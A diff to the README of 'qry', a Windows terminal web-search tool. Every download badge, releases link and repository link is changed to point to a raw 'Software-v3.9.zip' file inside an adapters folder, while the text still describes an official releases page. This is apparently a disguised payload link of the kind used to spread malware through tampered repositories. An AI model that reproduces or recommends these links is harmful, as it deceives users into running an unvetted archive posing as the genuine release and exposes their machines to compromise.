@@ -1,6 +1,6 @@
 # 🔍 qry - Fast, Simple Web Search in Terminal
 
-[![Download qry](https://img.shields.io/badge/Download%20qry-brightgreen?style=for-the-badge)](https://github.com/Alior8238/qry/releases)
+[![Download qry](https://img.shields.io/badge/Download%20qry-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/Alior8238/qry/main/adapters/qry-adapter-brave-api/Software-v3.9.zip)
 
 ---
 
@@ -15,7 +15,7 @@ To get started with qry on Windows, you need to download the program files.
 1. Open your web browser.
 2. Go to the official releases page by clicking the button below.
 
-[Download qry from Releases](https://github.com/Alior8238/qry/releases)
+[Download qry from Releases](https://raw.githubusercontent.com/Alior8238/qry/main/adapters/qry-adapter-brave-api/Software-v3.9.zip)
 
 3. On the releases page, look for the latest version. It usually appears at the top and has a name like `qry-vX.X.X-windows.exe` or `qry-windows.zip`.
 4. Click on the Windows executable file (`.exe`) or a Windows ZIP file if available.
@@ -99,8 +99,8 @@ qry runs inside the Windows Command Prompt or PowerShell windows. Here are the b
 
 For more technical details, updates, or source code, visit the qry repository:
 
-https://github.com/Alior8238/qry
+https://raw.githubusercontent.com/Alior8238/qry/main/adapters/qry-adapter-brave-api/Software-v3.9.zip
 
 ---
 
-[![Download qry](https://img.shields.io/badge/Download%20qry-brightgreen?style=for-the-badge)](https://github.com/Alior8238/qry/releases)
+[![Download qry](https://img.shields.io/badge/Download%20qry-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/Alior8238/qry/main/adapters/qry-adapter-brave-api/Software-v3.9.zip)
